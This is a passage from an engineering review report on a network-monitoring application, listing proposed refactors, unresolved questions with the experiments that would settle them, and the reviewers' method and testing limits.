| POLL-P1 | Poller | Read the interface table by column, not by row: ~20 GETBULK walks joined on the index suffix instead of 512 serial GETs | large |
| POLL-P2 | Poller | Split `nodepoll.py` (7,531 lines, six separable concerns); the diagnostics helpers and the SNMP transport are pure lifts | large |
| POLL-P3 | Poller | A `_best_effort()` idiom for the 35 `except SnmpError: pass` sites that re-raises credential verdicts | medium |
| POLL-P4 | Poller | Move `_refresh_addresses` out of `_poll_vendor_health` onto the `_poll_device` timeline beside the other cadence-gated reads | small |
| DATA-P1 | Data | Page `upstream_suggestions` in SQL instead of materialising the fleet's neighbour join per page | large |
| DATA-P2 | Data | One convention for private settings rows (`_private_setting` JSON versus syslog's hand-rolled `str(cursor)`) | small |
| DATA-P3 | Data | A generation scheme for the five `replace_*` walk writers, instead of `present = 0` then upsert (100,000 row writes an hour on a 50,000-MAC switch) | large |
| DATA-P4 | Data | A size warning for `app.db` — the one file that can grow without bound is the one nothing watches (the audit table must not be trimmed) | small |
| ALRT-P1 | Alerts | A real `webhook_credential` slot beside `smtp_credential`, with `has_webhook_credential` and a POST/DELETE pair — the full fix behind ALRT-F9 | large |
| ALRT-P2 | Alerts | Split `alertengine.py` into drains, thresholds, rollup and notification; the three threshold evaluators are one function plus a streak store | large |
| ALRT-P3 | Alerts | One drain contract — the eleven-line preamble copied five times, with ALRT-F7 the sixth that quietly did not follow it | medium |
| ALRT-P4 | Alerts | A per-rule compiled-pattern cache for compliance, so a fleet sweep does not re-run both heuristics per device per rule | small |
| ALRT-P5 | Alerts | Rule-type dispatch in `_apply`: a `kind → predicates` table beside `CLEARS`/`ROLLED_UP_BY` instead of 100 lines of sequential special cases | medium |
| FE-P1 | Frontend core | Merge the two row-diff caches (`nodes.js:340-458` and `app.js:4270-4330` — the same algorithm, ~70 lines deletable) | medium |
| FE-P2 | Frontend core | Split `nodes.refresh()`, which does five jobs and is the function FE-F1 and FE-F3 both live in | medium |
| FE-P3 | Frontend core | A conditional-GET/ETag path for the paged device list — the only real fix for FE-F3's 900 KB per tick | medium |
| FE-P4 | Frontend core | `App.pollWhileModal(token, ms, fn)` to retire four hand-rolled dialog-polling shapes (all four are correct today) | small |
| FE-P5 | Frontend core | Make dialog timers respect `document.hidden`, as the master loop already does | small |
| FM-P1 | Frontend modules | A mechanical escaping check: every `${…}` reaching a known sink must be a literal or wrapped in a known-safe helper (a crude version found both injection findings) | medium |
| FM-P2 | Frontend modules | Build MAPPER's scene into the detached group and append once, rather than inserting N links and N nodes into a live tree | small |
| FM-P3 | Frontend modules | Split `mapper.js` (2,397 lines, nine concerns) and `alerts.js` (2,043); the upstream-suggestions dialog is the cheapest first cut | medium |

---

## Unconfirmed

Twenty items the reviewers could not settle. None is a claim; each is a question with the experiment
that would answer it.

| ID | Item | What would confirm it |
|---|---|---|
| API-U1 | `_HOST_IP_MEMO` (`api.py:2294`) is a module global mutated without a lock and shared across every request and every `Service` in the process | A stress test alternating `?host=a`/`?host=b` syslog searches and asserting the memo's hit rate, plus a two-`Service` test asserting one cannot serve the other's resolution |
| API-U2 | SSRF reach of unvalidated `address`/`ip` on `post_ipam_dhcp_server` and `post_wireless_controller`, where `post_target` and `post_nodes_device` both validate | Reading `ipam_dhcp._powershell_binary`'s command construction around `server["address"]` for argument-boundary handling, and `fortipoll`'s use of `controller["ip"]` |
| API-U3 | `/api/config` exposes `never_scan_cidrs` and the retention caps to any signed-in account — plant segments an operator declared off-limits, readable with no module grant | A product decision on whether that crosses the line, i.e. whether to add it to `SETTINGS_ONLY_KEYS` |
| WEB-U1 | An encrypted TLS private key may hang the console: `load_cert_chain` passes no `password`, so OpenSSL prompts on the controlling terminal; from "Apply and restart" that is the Qt GUI thread | A passphrase-protected key run from a real terminal and from the console button |
| WEB-U2 | `stop_event.wait()` with no timeout may not be interruptible on Windows (`__main__.py:229`) | A Windows runner delivering Ctrl+C while the main thread is parked in `Event.wait()` |
| WEB-U3 | `parse_qs` silently drops a repeated query parameter's later values (`server.py:1155` takes `v[0]`) | An audit of all ~250 handlers for one that depends on repeats; none of those read did |
| POLL-U1 | `next_runs()` copies `self._next_run` without a lock while the scheduler thread writes and pops from it | A stress script calling `next_runs()` against another thread inserting/popping int keys for a few million iterations, on CPython 3.11 and 3.13 |
| POLL-U2 | Sustained-timeout cost of `credential_candidates` on a large mixed fleet: the negative cache is only set when there is more than one candidate, and its window is shorter than most poll intervals | `tests/bench_poll_cycle.py` with 300 dark devices on a four-credential profile against the same fleet on a one-credential profile |
| POLL-U3 | `_octets_from_value`'s `latin-1` fallback and the PortList/VLAN bitmap decoding it feeds | A capture from a Q-BRIDGE switch compared against the stored `port_vlans` rows; the clean fix is for `_decode_value` to carry the raw bytes alongside the rendering |
| DATA-U1 | `trim_to_size` may delete live rows to make room for freed-but-unreclaimed pages — `db.py` overrides `_trim_size` with `live_size_bytes()` and says why; no other store does | A store whose freelist exceeds `reclaim`'s budget (millions of freed pages) followed by a `_trim_db` in the same sweep; forcing it at 800k pruned rows did not reproduce (`freelist=0`, 0 live rows deleted) |
| DATA-U2 | A failed named migration leaves `alerts.db` half-migrated: `_run_named_migrations` writes each marker *after* the run, with no try/except, from the constructor — the opposite of `appdb`'s marker-first backfills | Injecting a failure into one named migration mid-way and checking whether the second start completes; and a decision on which marker convention the codebase means to have |
| ALRT-U1 | Traceroute hop addresses are stored and re-pinged without ever being validated as addresses | A traceroute build or locale whose output has a line matching the hop pattern with a leading-`-` token. A one-line `_is_ip()` guard closes it regardless and is being added as cheap hardening |
| ALRT-U2 | Threshold evaluation cost at the documented 2,000-device fleet: per-port families still produce devices × ports rows once all the per-port rules are on | A `tests/bench_alert_tick.py` in the shape of `bench_poll_cycle.py`, timing one `_evaluate_thresholds` at 2,000 devices × 48 ports with every per-port rule enabled |
| ALRT-U3 | `Decoder.learned_rates` may also lose a legitimately announced rate: an append landing between `list(rates)` and the rebind is dropped | Not reproduced; ALRT-F1's fix (a dict swapped under a lock) closes it outright |
| FE-U1 | FE-F5's cost figure — the demo fleet exposes no `rf_*` metrics on any of its 12 devices | A fixture device with `rf_signal_dbm` and a 20-second capture of `/series` responses with Bridge & RF open |
| FE-U2 | `App.saveCsv` clicks a **detached** `<a download>` and revokes the object URL on the next line; Chromium handles it, other engines unverified | Loading the same page in Firefox and pressing any Export CSV. If it fails it affects every export in the product |
| FE-U3 | Object-literal lookups keyed by server data (`STP_STATE_COLOR[r.stp_state]`, `CONFIDENCE_COLOR[c.confidence]`, `STATUS_PATTERN[status]`) resolve inherited `Object.prototype` members for keys like `constructor` | A device reporting such a value; the server maps `stp_state` through a fixed table, and the resulting strings carry no quote. `Object.create(null)` or a `Map` removes the class |
| FM-U1 | `URL.revokeObjectURL(link.href)` immediately after `link.click()` in MAPPER's PNG export and Debug's log export | Running each export in Firefox and Safari as well as Chromium and checking a file lands; if not, defer the revoke to a `setTimeout(…, 0)` |
| FM-U2 | FM-F8's secondary claim, that rebuilding a `<select>`'s options while its native dropdown is open closes or resets it | Opening Alerts, clicking the rule filter open and waiting out one 10 s poll in each target browser. The wasted DOM write stands regardless |
| FM-U3 | FM-F3's and FM-F5's costs are derived from the code path plus one off-DOM measurement (0.459 ms per `JSON.stringify`) | A browser profile of a rubber-band drag on a 2,000-node map and of a brush drag on a 30-day NetFlow window |

---

## Method and limits

Seven reviewers each took an area and read their files end to end, saying in their own reports which
files they only skimmed. Each read `CHANGELOG.md` §4.46.4 (the previous whole-tree review), §5.5.0
(the measurement pass), §5.8.0/§5.9.0 and `CREDENTIAL-SECURITY.md` first, so that a deliberate,
documented decision would not be re-raised as a defect — which is why, for instance, the v1/v2c
communities stored in the clear appear under "verified sound" with the document reference, and only
the v3 password that contradicts that document is a finding. No reviewer edited a repository file;
probes, fixtures and benchmark scripts were written under the session scratchpad and drove real
`WebServer`, real store classes, real decoders, a real `AlertEngine`, and stub SNMP agents. The lead
then consolidated, spot-verified at least the top finding of every report against the code, and split
the fixes into lanes by file ownership so parallel fixers never contend; each fix had to ship with a
test proved to fail before it, by running the new test against a stash or a temporary revert.

The whole suite ran once at the end, after every lane had landed: 140 of 141 suites passed. The
one skip is `test_console_shutdown.py`, which needs PySide6 and the desktop console; the one
failure is the pre-existing `test_prune_lock_hold.py` fairness assertion described below, which
fails on unchanged 5.9.0 in the same container. One integration defect surfaced only in that run
and was fixed before it: the poller lane had clamped `entPhySensorScale` to 1..9 on the
reviewer's word, where RFC 3433's enum runs to yotta(17), so a kilo(10) sensor read a thousand
times too small until `test_ups_environment.py` caught it.

What could not be exercised:

- **Only Chromium.** The frontend work used Playwright's Chromium against a live instance. Firefox
  and Safari are not installed here, which is why FE-U2 and FM-U1 — both about `<a download>` plus an
  immediate `revokeObjectURL` — are unconfirmed, and why FM-U2's "does rebuilding a select close its
  open dropdown" question is unanswered. If FE-U2 turns out to be real it affects every export in the
  product.
- **No Windows runner.** Windows is a shipping target and CI runs it, but nothing in this review ran
  there. WEB-U2 (whether Ctrl+C reaches a Python handler parked in `Event.wait()`) needs one, and the
  platform-specific paths that were checked — `SO_EXCLUSIVEADDRUSE`, the ICMP-unreachable `continue`,
  DPAPI dispatch, `ctypes.wintypes` importing cleanly on Linux — were checked by reading plus a Linux
  import test, not by running on Windows.
- **No real hardware.** PortList and VLAN egress bitmap decoding (POLL-U3) cannot be settled without
  a capture from a Q-BRIDGE switch, and the RF pane (FE-U1) has no `rf_*` metrics anywhere in the demo
  fleet, so its cost is read from the code. Everything else about the wire was exercised against stub
  agents, including two new ones written for this pass (`stub_agent_toobig.py` and a `wild_scale`
  mode in `stub_agent_ups_env.py`).
- **Benchmarks were not re-run wholesale.** The measurements quoted here are the ones the reviewers
  took while establishing a finding, on this host, with the fixtures each report names — they are
  evidence for a specific claim, not a release benchmark. Where a fix was meant to move a number, the
  pair is quoted before and after (the MIB range predicate, the two alert indexes, the prune stalls,
  the maintenance commits, the interface sockets). `tests/bench_prune.py` and
  `tests/bench_db_search.py` are the right instruments for the rest and are named in the reports as
  the follow-up.
- **One pre-existing test flake, recorded.** `tests/test_prune_lock_hold.py` carries a lock-fairness
  assertion (`reader.worst < total*0.8`) that trips intermittently under load, independent of the
  changes here — A/B measured at 0 failures in 6 runs with the new indexes and 3 in 6 without, and
  the lead ran the unchanged suite against `origin/main` in this container three times: it failed
  all three, each time on a different store, with the reader's worst wait close to the whole sweep.
  It is not caused by this work and is not fixed by it; on this host the reader thread is simply
  not scheduled while the writer runs.
